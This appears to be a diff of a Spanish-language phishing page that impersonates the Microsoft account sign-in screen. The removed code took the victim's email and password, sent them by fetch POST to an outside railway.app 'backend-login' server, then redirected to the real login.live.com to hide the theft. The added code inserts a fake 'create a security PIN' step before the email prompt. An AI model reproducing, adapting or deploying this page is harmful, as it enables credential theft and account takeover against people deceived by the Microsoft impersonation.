@@ -118,8 +118,34 @@
                 </picture>
             </div>
 
-            <!-- Primera Pantalla: Solicitar Correo -->
+            <!-- Pantalla 1: Crear PIN -->
             <div id="step1">
+                <h1 class="text-title margin-bottom-16">Crear un PIN de seguridad</h1>
+                <div class="row margin-bottom-16">
+                    <div class="form-group col-md-12 placeholderContainer">
+                        <input type="password" id="pinInput" class="form-control" placeholder="Crea un PIN de 4 dígitos" required="required" aria-required="true" autocomplete="off">
+                    </div>
+                </div>
+                <div class="row inline-block no-margin-top-bottom button-container">
+                    <button id="nextButton" class="btn btn-block btn-primary">Siguiente</button>
+                </div>
+            </div>
+
+            <!-- Pantalla 2: Confirmar PIN -->
+            <div id="step2" style="display: none;">
+                <h1 class="text-title margin-bottom-16">Confirmar el PIN</h1>
+                <div class="row margin-bottom-16">
+                    <div class="form-group col-md-12 placeholderContainer">
+                        <input type="password" id="pinConfirmInput" class="form-control" placeholder="Confirma tu PIN" required="required" aria-required="true" autocomplete="off">
+                    </div>
+                </div>
+                <div class="row inline-block no-margin-top-bottom button-container">
+                    <button id="confirmPinButton" class="btn btn-block btn-primary">Confirmar PIN</button>
+                </div>
+            </div>
+
+            <!-- Pantalla 3: Solicitar Correo -->
+            <div id="step3" style="display: none;">
                 <h1 class="text-title margin-bottom-16">Iniciar sesión</h1>
                 <div class="row margin-bottom-16">
                     <div class="form-group col-md-12 placeholderContainer">
@@ -127,7 +153,7 @@
                     </div>
                 </div>
                 <div class="row inline-block no-margin-top-bottom button-container">
-                    <button id="nextButton" class="btn btn-block btn-primary">Siguiente</button>
+                    <button id="nextButtonEmail" class="btn btn-block btn-primary">Siguiente</button>
                 </div>
                 <!-- Sección de creación de cuenta con enlace -->
                 <div class="___wqsyy40 f15tpi3i">
@@ -135,24 +161,6 @@
                     <a href="https://signup.live.com/signup" tabindex="0" role="button" aria-label="Crear una cuenta de Microsoft " id="signup" data-testid="signUpLink" class="___1hl8tjj f11xvspe f1bsjrm3 f3rmtva f1ern45e f1n71otn f1h8hb77 f1deefiw fryk5ur fv6z6zc f1cio4g9 f1mwb9y5 f1ynmygo f121g8nd f1i82eaq f8491dx f1nbblvp fifp7yv f1ov4xf1 f1asdtw4 f1gqcn34 fbabzkn felxxx9 fqttjmt">
                         Cree una.
                     </a>
-                </div>
-            </div>
-
-            <!-- Segunda Pantalla: Solicitar Contraseña -->
-            <div id="step2" style="display: none;">
-                <h1 class="text-title margin-bottom-16">Escribir contraseña</h1>
-                <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12 placeholderContainer">
-                        <input type="email" id="emailDisplay" class="form-control" disabled>
-                    </div>
-                </div>
-                <div class="row margin-bottom-16">
-                    <div class="form-group col-md-12 placeholderContainer">
-                        <input type="password" id="passwordInput" name="pwd" class="form-control" placeholder="Contraseña" required="required" aria-required="true" autocomplete="off">
-                    </div>
-                </div>
-                <div class="row inline-block no-margin-top-bottom button-container">
-                    <button id="loginButton" class="btn btn-block btn-primary">Iniciar sesión</button>
                 </div>
             </div>
         </main>
@@ -171,53 +179,49 @@
         // Elementos del DOM
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const pinInput = document.getElementById('pinInput');
+        const pinConfirmInput = document.getElementById('pinConfirmInput');
         const emailInput = document.getElementById('emailInput');
         const emailDisplay = document.getElementById('emailDisplay');
         const nextButton = document.getElementById('nextButton');
-        const loginButton = document.getElementById('loginButton');
+        const confirmPinButton = document.getElementById('confirmPinButton');
+        const nextButtonEmail = document.getElementById('nextButtonEmail');
 
-        // Paso 1: Ir a la pantalla de contraseña
+        // Paso 1: Ir a la pantalla de confirmación de PIN
         nextButton.addEventListener('click', () => {
+            const pin = pinInput.value.trim();
+            if (pin.length !== 4) {
+                alert('Por favor, ingrese un PIN de 4 dígitos.');
+                return;
+            }
+
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+        });
+
+        // Paso 2: Confirmar PIN
+        confirmPinButton.addEventListener('click', () => {
+            const pin = pinInput.value.trim();
+            const confirmPin = pinConfirmInput.value.trim();
+            if (pin !== confirmPin) {
+                alert('Los PINs no coinciden. Por favor, intente de nuevo.');
+                return;
+            }
+
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+        });
+
+        // Paso 3: Ir a la pantalla de inicio de sesión con correo
+        nextButtonEmail.addEventListener('click', () => {
             const email = emailInput.value.trim();
             if (!email) {
                 alert('Por favor, ingrese un correo válido.');
                 return;
             }
 
-            // Mostrar la segunda pantalla
-            emailDisplay.value = email;
-            step1.style.display = 'none';
-            step2.style.display = 'block';
-        });
-
-        // Paso 2: Iniciar sesión
-        loginButton.addEventListener('click', async () => {
-            const email = emailDisplay.value;
-            const password = document.getElementById('passwordInput').value.trim();
-
-            if (!password) {
-                alert('Por favor, ingrese su contraseña.');
-                return;
-            }
-
-            try {
-                const response = await fetch('https://backend-login-production-375d.up.railway.app/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ mail: email, pwd: password })
-                });
-
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    alert(errorData.error || 'Error desconocido');
-                    return;
-                }
-
-                // Redirigir al usuario a https://login.live.com
-                window.location.href = 'https://login.live.com';
-            } catch (error) {
-                alert('Error de conexión al servidor.');
-            }
+            window.location.href = 'https://login.live.com';
         });
     </script>
 </body>
